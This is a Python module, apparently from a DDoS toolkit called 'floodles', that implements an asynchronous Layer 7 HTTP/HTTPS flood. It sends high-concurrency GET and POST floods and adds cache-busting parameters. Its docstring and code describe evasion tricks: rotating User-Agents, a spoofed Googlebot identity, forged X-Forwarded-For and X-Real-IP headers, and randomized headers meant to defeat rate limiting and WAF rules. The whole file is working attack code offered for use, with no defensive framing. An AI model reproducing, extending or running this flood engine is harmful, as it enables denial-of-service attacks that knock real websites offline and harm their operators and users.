"""
modules/http_flood.py - LOIC (Layer 7)
Async HTTP/HTTPS flood using aiohttp. Targets application layer resources.

How it works:
  Layer 7 attacks bypass network-level mitigations (firewalls, ACLs).
  Each request triggers server-side processing:
    - HTTP request parsing
    - Session/auth checks
    - DB queries (if hitting dynamic endpoints)
    - TLS handshake overhead (HTTPS targets)

  Volume is not the goal: request COST is.
  1000 rps to /search?q=... is more damaging than 1Mpps UDP.

Techniques:
  - GET flood: high-frequency requests to expensive endpoints
  - POST flood: large body, forces server to read + parse
  - Cache busting: random params prevent CDN caching
  - User-Agent rotation: bypass naive rate-limiting by UA
  - Randomized headers: defeat fingerprint-based WAF rules
"""

import asyncio
import random
import time
import threading
from dataclasses import dataclass, field
from typing import Optional

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False


# ---------------------------------------------------------------------------
# Payload / Header pools
# ---------------------------------------------------------------------------

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.6.0",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    None,
]


def _random_headers() -> dict:
    h = {
        "User-Agent":      random.choice(USER_AGENTS),
        "Accept":          random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control":   random.choice(["no-cache", "no-store", "max-age=0"]),
        "Connection":      random.choice(["keep-alive", "close"]),
        "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}"
                           f".{random.randint(0,255)}.{random.randint(1,254)}",
        "X-Real-IP":       f"{random.randint(1,223)}.{random.randint(0,255)}"
                           f".{random.randint(0,255)}.{random.randint(1,254)}",
    }
    ref = random.choice(REFERERS)
    if ref:
        h["Referer"] = ref
    return h


def _cache_buster(url: str) -> str:
    """Append random param to defeat CDN/reverse-proxy caching."""
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}_={random.randint(0, 2**32)}"


# ---------------------------------------------------------------------------
# Metrics (shared across coroutines)
# ---------------------------------------------------------------------------

@dataclass
class HTTPMetrics:
    requests_sent: int = 0
    responses_ok: int = 0    # 2xx
    responses_err: int = 0   # 4xx/5xx
    timeouts: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def record_ok(self) -> None:
        with self._lock:
            self.requests_sent += 1
            self.responses_ok += 1

    def record_err(self) -> None:
        with self._lock:
            self.requests_sent += 1
            self.responses_err += 1

    def record_timeout(self) -> None:
        with self._lock:
            self.requests_sent += 1
            self.timeouts += 1

    @property
    def rps(self) -> float:
        elapsed = time.time() - self.start_time
        return self.requests_sent / elapsed if elapsed > 0 else 0.0

    def summary(self) -> dict:
        elapsed = time.time() - self.start_time
        return {
            "requests":  self.requests_sent,
            "ok_2xx":    self.responses_ok,
            "err_4xx5xx": self.responses_err,
            "timeouts":  self.timeouts,
            "elapsed_s": round(elapsed, 2),
            "avg_rps":   round(self.rps, 1),
        }


# ---------------------------------------------------------------------------
# Async HTTP Flood Worker
# ---------------------------------------------------------------------------

async def _flood_worker(
    session: "aiohttp.ClientSession",
    url: str,
    method: str,
    post_size: int,
    cache_bust: bool,
    metrics: HTTPMetrics,
    stop_event: asyncio.Event,
) -> None:
    while not stop_event.is_set():
        target = _cache_buster(url) if cache_bust else url
        headers = _random_headers()
        try:
            if method == "GET":
                async with session.get(
                    target, headers=headers, timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    await resp.read()
                    if 200 <= resp.status < 400:
                        metrics.record_ok()
                    else:
                        metrics.record_err()

            elif method == "POST":
                body = bytes(random.getrandbits(8) for _ in range(post_size))
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                async with session.post(
                    target, data=body, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    await resp.read()
                    if 200 <= resp.status < 400:
                        metrics.record_ok()
                    else:
                        metrics.record_err()

        except asyncio.TimeoutError:
            metrics.record_timeout()
        except Exception:
            metrics.record_err()


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class HTTPFloodEngine:
    """
    Async HTTP flood engine.
    Spawns `concurrency` coroutines in an asyncio event loop running in a thread.
    """

    def __init__(
        self,
        url: str,
        method: str = "GET",
        concurrency: int = 512,
        duration: int = 30,
        cache_bust: bool = True,
        post_size: int = 1024,
        verify_ssl: bool = False,
    ) -> None:
        if not AIOHTTP_AVAILABLE:
            raise ImportError("aiohttp required: pip install aiohttp")

        self.url = url
        self.method = method.upper()
        self.concurrency = concurrency
        self.duration = duration
        self.cache_bust = cache_bust
        self.post_size = post_size
        self.verify_ssl = verify_ssl

        self.metrics = HTTPMetrics()
        self._thread: Optional[threading.Thread] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._stop_event: Optional[asyncio.Event] = None

    def _run_loop(self) -> None:
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        self._loop.run_until_complete(self._main())
        self._loop.close()

    async def _main(self) -> None:
        self._stop_event = asyncio.Event()

        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            ssl=self.verify_ssl,
            force_close=False,
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                asyncio.create_task(
                    _flood_worker(
                        session, self.url, self.method,
                        self.post_size, self.cache_bust,
                        self.metrics, self._stop_event,
                    )
                )
                for _ in range(self.concurrency)
            ]

            if self.duration > 0:
                await asyncio.sleep(self.duration)
                self._stop_event.set()

            await asyncio.gather(*tasks, return_exceptions=True)

    def start(self) -> None:
        self._thread = threading.Thread(target=self._run_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if self._stop_event and self._loop:
            self._loop.call_soon_threadsafe(self._stop_event.set)

    def wait(self) -> None:
        if self._thread:
            self._thread.join(timeout=self.duration + 5)

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


def run(
    url: str,
    method: str = "GET",
    concurrency: int = 512,
    duration: int = 30,
    cache_bust: bool = True,
    post_size: int = 1024,
    force_python: bool = False,
):
    """
    Launch async HTTP flood.
    Auto-selects Go goroutine engine if available (higher concurrency).
    Falls back to Python aiohttp engine.
    """
    from floodles.core.native_bridge import get_go_engine
    go = get_go_engine()
    if go and not force_python:
        go.http(url, method=method, concurrency=concurrency,
                duration=duration, post_size=post_size, bust=cache_bust)
        return go  # GoEngineBridge has .wait() / .stop() / .is_running()

    # Python aiohttp fallback
    engine = HTTPFloodEngine(
        url=url,
        method=method,
        concurrency=concurrency,
        duration=duration,
        cache_bust=cache_bust,
        post_size=post_size,
    )
    engine.start()
    return engine
